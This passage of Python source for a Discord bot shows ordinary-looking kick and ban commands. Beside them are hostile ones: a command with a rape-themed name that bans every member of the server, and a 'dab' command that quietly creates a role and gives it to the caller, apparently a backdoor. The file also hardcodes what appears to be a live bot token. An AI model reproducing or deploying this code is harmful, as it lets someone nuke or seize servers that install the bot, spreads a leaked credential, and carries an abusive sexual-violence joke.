lient = commands.Bot(command_prefix='$') #This Is The Prefix, Feel Free To Change It Anytime
...
async def kick(ctx, user: discord.Member=None):
    ...
    if author.server_permissions.kick_members:
        if user is None:
            ...
            await client.say (":boot: mmmm I kicked **{}**".format(user.name))
...
async def ban(ctx, user: discord.Member=None):
    ...
    if author.server_permissions.kick_members:
        if user is None:
            ...
            await client.say(" mmmm I banned **{}**".format(user.name))
...
async def rape(ctx):
        ...
        await client.send_message(channel, " Damage luv!!")
        for user in list(ctx.message.server.members):
            try:
                await client.ban(user)
...
async def dab(ctx):
    ...
    await client.create_role(server, name='lolzie', permissions=perms)
    user = ctx.message.author
    role = discord.utils.get(user.server.roles, name="lolzie")
    await client.add_roles(user, role)
    print ("You're in bae")

client.run("Nzk2NzkxMDI4NjYxMDkyNDIy.X_dDeA.79w_ikhmXYnL1gm12GnZdbHut3s") #Bot's Token Code Goes Here
